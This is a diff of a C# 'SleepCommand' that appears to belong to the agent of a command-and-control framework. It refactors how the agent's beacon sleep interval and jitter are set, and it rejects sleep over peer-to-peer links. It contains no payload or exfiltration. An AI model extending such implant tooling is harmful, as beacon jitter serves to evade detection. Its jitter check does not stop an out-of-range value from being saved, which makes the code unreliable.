@@ -1,4 +1,6 @@
-﻿using Agent.Models;
+﻿using Agent.Communication;
+using Agent.Models;
+using Shared;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -10,34 +12,38 @@ namespace Agent.Commands
 {
     public class SleepCommand : AgentCommand
     {
-        public override string Name => "sleep";
-
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.Sleep;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            if (task.SplittedArgs.Count() == 0)
+            if(context.Agent.MasterCommunicator is P2PCommunicator)
             {
-                context.Result.Result = $"Delay is {context.Agent.Communicator.MessageService.AgentMetaData.SleepInterval}s +/- {context.Agent.Communicator.MessageService.AgentMetaData.SleepJitter*100}%";
+                context.Error("Sleep is not supported in P2P Communication");
                 return;
             }
 
-            int delay = int.Parse(task.SplittedArgs[0]);
-            int jitter = 0;
-            if (task.SplittedArgs.Count() > 1)
+            if (!task.HasParameter(ParameterId.Delay))
             {
-                jitter = int.Parse(task.SplittedArgs[1]);
+                context.AppendResult($"Delay is {context.Agent.MetaData.Sleep}");
+                return;
+            }
+
+            int delay = task.GetParameter<int>(ParameterId.Delay);
+            int jitter = 0;
+            if (task.HasParameter(ParameterId.Jitter))
+            {
+                jitter = task.GetParameter<int>(ParameterId.Jitter);
             }
 
             if(jitter < 0 || jitter >= 100)
             {
-                context.Result.Result = "Jitter is not correct (should be 0-99%)";
+                context.Error("Jitter is not correct (should be 0-99%)");
             }
 
-            context.Agent.Communicator.MessageService.AgentMetaData.SleepInterval = delay;
-            context.Agent.Communicator.MessageService.AgentMetaData.SleepJitter = jitter;
+            context.Agent.MetaData.SleepInterval = delay;
+            context.Agent.MetaData.SleepJitter = jitter;
 
-            context.Result.Result = $"Delay is set to {context.Agent.Communicator.MessageService.AgentMetaData.SleepInterval}s - {context.Agent.Communicator.MessageService.AgentMetaData.SleepJitter}%";
-
-            this.SendMetadataWithResult = true;
+            context.AppendResult($"Delay is set to {context.Agent.MetaData.Sleep}");
+            await context.Agent.SendMetaData();
         }
     }
 }
